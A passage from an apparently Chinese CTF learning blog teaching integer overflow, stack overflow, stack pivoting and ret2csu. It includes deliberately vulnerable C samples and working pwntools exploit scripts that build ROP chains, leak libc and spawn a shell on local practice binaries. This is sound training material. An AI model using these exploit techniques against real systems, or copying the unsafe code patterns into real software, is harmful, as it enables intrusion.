class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_map=fake_map+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x000000000040101a</span>)+p64(<span class="hljs-number">0x0000000000401273</span>)+p64(d+bin_sh)+p64(<span class="hljs-number">0x401026</span>)+p64(d)+p64(<span class="hljs-number">0</span>))<br>p.sendline(fake_map)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>整型溢出及栈溢出</title>
    <link href="/page/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E5%9F%BA%E7%A1%80/"/>
    <url>/page/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="整数溢出">整数溢出</h1><p>由于数据类型的使用不当产生的利用点<br>如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">10</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,c,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">if</span> (c[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>        a=atoi(c);<br>        <span class="hljs-keyword">if</span> (a&gt;=<span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (a&lt;<span class="hljs-number">10</span>) &#123;<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个示例中，输入<code>4294967295</code>，是可以执行 <code>system(&quot;/bin/sh&quot;);</code> ，因为<code>a</code>是<code>int</code>类型，默认为<code>4字节有符号整型</code>，而<code>4294967295</code>的十六进制为 <code>0xffffffff</code>,刚好为<code>-1</code>的补码 ，所以实际a的值为<code>-1</code>, <code>-1&lt;0&lt;10</code>,所以可以绕过判断执行<code>system(&quot;/bin/sh&quot;);</code></p><h1 id="栈溢出">栈溢出</h1><h2 id="简单溢出">简单溢出</h2><blockquote><p>当程序对输入的数据大小没有限制或限制不严谨，就会出现栈溢出</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> *binsh=<span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;date&quot;</span>);<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc 1.c -m64 -o s64 -fno-stack-protector -no-pie</span><br><span class="hljs-comment">    gcc 1.c -m32 -o s32 -fno-stack-protector -no-pie</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="x86">x86</h3><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA.jpg" srcset="/img/loading.gif" lazyload alt="调用vuln函数过程" title="调用vuln函数过程"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数返回过程" title="vuln函数返回过程"></p><p>通过返回过程可以看出，如果将栈中储存的<code>vuln返回地址</code>修改了，就可以控制程序执行流程，且参数就放在 返回地址后面，这样调用某个函数并传参非常方便</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    通过栈溢出，控制返回地址为 system@plt ,并设置参数为 &quot;/bin/sh&quot; </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    system函数在plt表中的地址为 0x8049090</span><br><span class="hljs-string">    /bin/sh 字符串在程序中的地址为 0x804a008</span><br><span class="hljs-string">    ret 指令地址为 0x804900e</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./s32&#x27;</span>)<br><br>ret=<span class="hljs-number">0x0804900e</span><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x8049090</span>)+p32(ret)+p32(<span class="hljs-number">0x804a008</span>))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    设置vuln函数返回地址为 0x8049090</span><br><span class="hljs-string">    设置system函数返回地址为 0x804900e (任意地址)</span><br><span class="hljs-string">    设置system函数参数为 0x804a008</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="x86-64">x86_64</h3><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-2.jpg" srcset="/img/loading.gif" lazyload alt="调用vuln函数过程" title="调用vuln函数过程"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-3.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数返回过程" title="vuln函数返回过程"></p><p>通过返回过程可以看出，如果将栈中储存的<code>vuln返回地址</code>修改了，就可以控制程序执行流程，但前6个参数通过寄存器传入，调用某个函数并传参，就比较麻烦，需要找到<code>pop xxx;ret</code> 指令，控制寄存器</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    通过栈溢出，先调用 pop rdi;ret 指令，设置 system函数 的参数，</span><br><span class="hljs-string">    然后调用 system@plt </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    system函数在plt表中的地址为 0x401060</span><br><span class="hljs-string">    /bin/sh 字符串在程序中的地址为 0x402004</span><br><span class="hljs-string">    ret 指令地址为 0x40101a</span><br><span class="hljs-string">    pop rdi;ret 指令地址为 0x4012b3</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>rdi=<span class="hljs-number">0x4012b3</span><br>ret=<span class="hljs-number">0x40101a</span><br>p=process(<span class="hljs-string">&#x27;./s64&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp %s&#x27;</span>%ret)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(rdi)+p64(<span class="hljs-number">0x402004</span>)+p64(<span class="hljs-number">0x401060</span>))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    设置vuln函数返回地址为 0x40101a 用来对齐栈</span><br><span class="hljs-string">    设置rdi寄存器的值为 0x402004</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-4.jpg" srcset="/img/loading.gif" lazyload alt=""><br>因为在<code>system</code>函数中 执行了指令 <code>movaps xmmword ptr[rsp+0x50],xmm0</code>, 即 向 <code>rsp+0x50</code>的地址处写入 <code>128</code> 位的数据, 而 <code>movaps</code>指令需要对齐，所以<code>rsp+0x50</code>指向的地址就要与<code>128位</code>(<code>0x10字节</code>)对齐 ,但这里<code>rsp</code>指向的地址为<code>0x7ffcc3740e48</code>显然无法与<code>0x10</code>对齐, 所以在执行<code>system</code>函数时会导致程序中断, 虽然按照逻辑是可以获取<code>shell</code>的,但因为程序中断了,所以获取不了<code>shell</code></p><h2 id="栈迁移">栈迁移</h2><blockquote><p>当存在栈溢出，但溢出的数据较小时，可以尝试使用栈迁移</p></blockquote><h3 id="能够覆盖ret">能够覆盖ret</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*样例代码*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x30</span>);<br>    write(<span class="hljs-number">1</span>,a,<span class="hljs-number">0x30</span>);<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><blockquote><p>在这个仅向栈中写入数据的例子中，数据的地址必须通过<code>rbp</code>计算得到</p></blockquote><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB.jpg" srcset="/img/loading.gif" lazyload alt="main 函数代码" title="main 函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB-1.jpg" srcset="/img/loading.gif" lazyload alt="main 函数栈布局" title="main 函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB-2.jpg" srcset="/img/loading.gif" lazyload alt="main 函数汇编代码" title="main 函数汇编代码"><br>存在 <code>leave;ret</code> 相当于 <code>mov rsp,rbp;pop rbp;ret</code></p><p>程序中不存在后门函数，那么想要获取<code>shell</code>, 就需要获取libc地址，通过栈迁移构造<code>system(&quot;/bin/sh&quot;);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    将栈迁移到 got表 附近通过 write 获取程序引用的 libc在内存中的基地址 </span><br><span class="hljs-string">    然后将栈迁移到 bss段 中较高的地址处，执行 system函数 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;pwn_tran&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>leave=<span class="hljs-number">0x4011bd</span><br>ret=<span class="hljs-number">0x4011be</span><br>read=<span class="hljs-number">0x401182</span><br>write=<span class="hljs-number">0x40119d</span><br>bss=<span class="hljs-number">0x404048</span><br>read_got=<span class="hljs-number">0x404020</span><br>rdi=<span class="hljs-number">0x0000000000401223</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(bss)+p64(read))<br>p.read()<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(bss+<span class="hljs-number">0x800</span>)+p64(read)+p64(bss-<span class="hljs-number">0x18</span>)+p64(bss-<span class="hljs-number">0x18</span>)+p64(write)<br>p.send(payload)<br>p.read(<span class="hljs-number">0x40</span>)<br>read_addr=u64(p.read(<span class="hljs-number">8</span>))<br>libc.address=read_addr-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>bss=bss+<span class="hljs-number">0x700</span><br>payload=p64(bss+<span class="hljs-number">0x200</span>)+p64(rdi)+p64(bin_sh)+p64(system)+p64(bss+<span class="hljs-number">0x100</span>-<span class="hljs-number">0x20</span>)+p64(leave)<br><span class="hljs-comment"># 在调用system时不能使用上面在bss段中设置的/bin/sh作为参数 ,因为他在调用write函数时被修改了</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="无法覆盖ret">无法覆盖ret</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*样例代码*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">char</span> b[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x28</span>);<br>    read(<span class="hljs-number">0</span>,b,<span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-number">1</span>,b,<span class="hljs-number">0x60</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a=<span class="hljs-number">0</span>;<br>    func();<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1.jpg" srcset="/img/loading.gif" lazyload alt="main 函数代码" title="main 函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-1.jpg" srcset="/img/loading.gif" lazyload alt="main 函数栈布局" title="main 函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-2.jpg" srcset="/img/loading.gif" lazyload alt="main 函数汇编代码" title="main 函数汇编代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-3.jpg" srcset="/img/loading.gif" lazyload alt="func 函数代码" title="func 函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-4.jpg" srcset="/img/loading.gif" lazyload alt="func 函数栈布局" title="func 函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-5.jpg" srcset="/img/loading.gif" lazyload alt="func 函数汇编代码" title="func 函数汇编代码"></p><p>就我现在的认知来说，当栈溢出只能修改<code>rbp</code>时，至少需要在返回时连续执行两次<code>leave</code>，才可能控制<br>&gt;  如果在函数返回后，不存在对向栈中写入数据的操作，则需要用户在迁移前向一块地址已知的区域写入数据，否则就无法控制程序流<br>&gt;  如果在函数返回后，存在向栈中写入数据的操作(写入数据地址通过<code>rbp</code>计算)，那么依旧可以控制程序流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为程序允许向 bss 段中写入数据，而且在 main 函数中也存在 leave;ret 指令，</span><br><span class="hljs-string">    所以我们在 func 函数中将 rbp 设置为全局变量 b ，</span><br><span class="hljs-string">    然后通过 main 函数中的 leave;ret 指令，将栈迁移到 bss 段中</span><br><span class="hljs-string">    在bss段中构造指令泄露 read 函数真实地址，</span><br><span class="hljs-string">    从而获取 libc 的基地址，进而获取 system 函数地址</span><br><span class="hljs-string">    因为全局变量 b 太靠近不可写的段了，</span><br><span class="hljs-string">    所以需要将栈迁移到较高地址处，然后执行 system(&quot;/bin/sh&quot;) </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>b_add=<span class="hljs-number">0x404060</span><br>read_got=<span class="hljs-number">0x404020</span><br>read=<span class="hljs-number">0x401182</span><br>write_plt=<span class="hljs-number">0x401050</span><br>read_plt=<span class="hljs-number">0x401060</span><br>rdi=<span class="hljs-number">0x401263</span><br>rsi_15=<span class="hljs-number">0x401261</span><br>leave=<span class="hljs-number">0x4011d4</span><br><br>e=ELF(<span class="hljs-string">&#x27;./pwn_tran&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;pwn_tran&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(b_add))<br>p.sendline(p64(b_add)+p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi_15)+p64(read_got)+p64(<span class="hljs-number">0</span>)+p64(write_plt)+p64(read))<br>p.read(<span class="hljs-number">0x60</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>p.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>payload=p64(b_add+<span class="hljs-number">0x808</span>)+p64(rdi)+p64(<span class="hljs-number">0</span>)+p64(rsi_15)+p64(b_add+<span class="hljs-number">0x808</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(leave)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>p.send(payload)<br>pause()<br>p.send(p64(b_add+<span class="hljs-number">0x900</span>)+p64(rdi)+p64(bin_sh)+p64(system))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2csu">ret2csu</h2><p>当在执行某些函数或系统调用时需要设置 <code>rdi,rsi,rdx</code> 寄存器时，可以使用<code>ret2csu</code>方法设置寄存器</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-csu.jpg" srcset="/img/loading.gif" lazyload alt=""></p><p>利用下半段指令控制寄存器，利用上半段指令设置<code>rdi,rsi,rdx</code>寄存器，并执行指定地址储存的函数地址(也可以是指令地址)，函数或指令的地址通过 <code>r15+rbx*8</code> 获取,所以需要先在已知地址处写入函数或指令的地址(也可以是got表中的成员)</p><p>在控制寄存器时一般设置 <code>rbx=0,rbp=1</code> 这样可以跳出上半段的循环，设置<code>r15</code>为函数地址的二级指针，设置<code>r12</code>为<code>rdi</code>的值(仅支持4字节)，<code>r13</code>为<code>rsi</code>的值，<code>r14</code>为<code>rdx</code>的值，就将64位程序的前三个参数设置好了</p><blockquote><p>在我的理解中，<code>ret2csu</code>就是用来修改 <code>rdx</code>寄存器的值，因为存在<code>__libc_csu_init</code>函数就存在 <code>pop rdi</code> 与 <code>pop rsi;pop r15</code>指令 ，这样就解决了前两个参数，而<code>pop rdx</code>指令一般不存在，所以需要利用<code>ret2csu</code>设置</p></blockquote><p>仅在<code>64位程序</code>中使用，因为<code>64位程序</code>使用寄存器传参，而<code>32位程序</code>的参数储存在栈中，不需要再单独通过<code>ret2csu</code>控制参数</p><p>样例为<code>buuctf</code>中的<code>ciscn_2019_s_3</code>题目</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img 